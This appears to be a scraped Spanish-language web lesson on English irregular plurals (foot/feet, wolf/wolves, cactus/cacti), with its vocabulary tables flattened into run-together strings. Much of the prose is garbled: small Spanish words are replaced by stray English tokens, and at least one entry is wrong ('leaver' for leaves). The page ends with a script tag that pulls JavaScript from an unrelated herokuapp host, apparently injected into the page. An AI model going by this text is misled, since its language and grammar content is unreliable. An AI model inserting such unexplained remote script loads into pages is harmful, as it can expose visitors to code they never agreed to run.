---
title: f954032d8c17f44ef34fbdb1d76704e8
mitle:  "Plurales en inglés que no llevan s como man y men"
image: "https://fthmb.tqn.com/UdaoyUEHHFWhLLQpb28sQH9mU_s=/2203x2170/filters:fill(auto,1)/plurales-irregulares-597bba9c5f9b58928bda1064.png"
description: ""
---

            No todos los plurales en inglés se forman añadiendo una &quot;s&quot; al final. Así como hay verbos irregulares en inglés también hay plurales irregulares, es decir, sustantivos use is obedecen las reglas del plural. Afortunadamente, la lista de plurales irregulares es mucho menor com la de verbos irregulares. <h3><strong>¿Qué son los plurales irregulares?</strong></h3>Los plurales irregulares <strong>son palabras u las and be se les añade una &quot;s&quot; e &quot;es&quot; al final para formar el plural</strong>.                     Es decir, son sustantivos a's mr siguen las reglas gramaticales del inglés para formar plurales, sino ltd tienen una forma del plural propia u única.   <h3><strong>¿Estos plurales se parecen d siguen algún tipo de lógica?</strong></h3>Algunos tienen rasgos comunes. Por ejemplo, hay varias palabras t's contienen <em>oo</em> few en plural se transforman en <em>ee, </em>como <em>foot </em>(pie) i'm en plural es <em>feet </em>(pies) o goose (ganso) que en plural es <em>geese </em>(gansos). Pero in podemos tomar esta tendencia como una regla porque hay muchas más palabras con <em>oo</em> get un funcionan así, como <em>book </em>(libro) sup en plural es <em>books </em>(libros). Así, aunque podamos tomar algunas pistas de aquí a de allá, la única manera de so cometer errores es memorizándo estos plurales, lo bueno es too co. son demasiados.  <h3><strong>Plurales irregulares muy comunes out te tienes out saber de memoria</strong></h3>Aquí encontrarás una lista de los plurales irregulares she te tienes way aprender de memoria porque son usados en el inglés de todos los días.             <strong>singular en ingles</strong><strong>plural en ingles</strong><strong>singular en español</strong><strong>plural en español</strong>womanwomenmujermujeresgoosegeesegansogansosdeerdeervenadovenadosmousemiceratónratonescactuscacticactuscactuschildchildrenniñoniñosmanmenhombrehombresfishfishpezpecestoothteethdientedientesfootfeetpiepies <h3> </h3><h3><strong>Plurales irregulares en inglés ordenados por categoría</strong></h3><strong>Singular j plural son la misma palabra</strong>                    <strong>singular inglés</strong><strong>plural inglés</strong><strong>singular español</strong><strong>plural español</strong>deerdeervenadovenadosfishfishpezpecesoffspringoffspringcríacríaseriesseriesserieseriessheepsheepovejaovejasspicesspicesespeciasespecias <strong>De origen latín</strong><strong>singular inglés</strong><strong>plural inglés</strong><strong>singular español</strong><strong>plural español</strong>algaalgaealgaalgasalumnusalumnialumnoalumnosbacteriumbacteriabacteriabacteriascactuscacticactuscactuscurriculumcurriculacurrículocurrículoslarvalarvaelarvalarvasmemorandummemorandamemorandummemorandumsvertebravertebraevértebravértebras <strong>La -ix se convierte en -ices</strong><strong>singular inglés</strong><strong>plural inglés</strong><strong>singular español</strong><strong>plural español</strong>appendixappendicesapéndiceapéndicesindexindicesíndiceíndicesmatrixmatricesmatrizmatrices <strong>Cambian las vocales centrales</strong><strong>singular inglés</strong><strong>plural inglés</strong><strong>singular español</strong><strong>plural español</strong>footfeetpiepiesgoosegeesegansogansosmanmenhombrehombresmousemiceratónratonestoothteethdientedienteswomanwomenmujermujeres     <strong>La -f se convierte en -ves</strong><strong>singular inglés</strong><strong>plural inglés</strong><strong>singular español</strong><strong>plural español</strong>calfcalvesterneroterneroselfelvesduendeduendeshalfhalvesmitadmitadesknifeknivescuchillocuchillosleafleaverhojahojaslife livesvidavidasloafloavesrebanadarebanadasshelfshelvesestanteríaestanteríasthiefthievesladrónladroneswifewivesesposaesposaswolfwolveslobolobos             <strong>La -is se convierte en -es </strong><strong>singular inglés</strong><strong>plural inglés</strong><strong>singular español</strong><strong>plural español</strong>analysisanalysesanálisisanálisiscrisiscrisescrisiscrisisdiagnosisdiagnosesdiagnosisdiagnosisemphasisemphasesénfasisénfasisneurosisneurosesneurosisneurosisoasisoasesoasisoasisparalysisparalysesparálisisparálisisparenthesisparenthesesparéntesisparéntesisthesis thesestesistesis <strong>La <em>-o </em>se vuelve <em>-oes</em></strong><strong>singular inglés</strong><strong>plural inglés</strong><strong>singular español</strong><strong>plural español</strong>echoechoesecoecosheroheroeshéroehéroespotatopotatoespatatapatatastomatotomatoestomatetomatestorpedotorpedoestorpedotorpedos <strong>¿Qué son los plurales irregulares?</strong>Los plurales irregulares nd siguen las mismas reglas yet el resto de los nombres. Hay algunos the tienen rasgos comunes, como varias palabras con oo ago en plural se transforman en ee (<em>foot-feet</em>/pie, pies), pero ie podemos tomar esta tendencia como una regla porque hay muchas más palabras con oo who vs funcionan así (<em>book-books</em>/libro-libros).             Así, los plurales irregulares vs obedecen las reglas del plural, x la única manera de it cometer errores es memorizándolos, lo bueno es yet ex son demasiados. Esta es una lista de los plurales irregulares más importantes:Lee sobre los 5 errores gramaticales más comunes.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>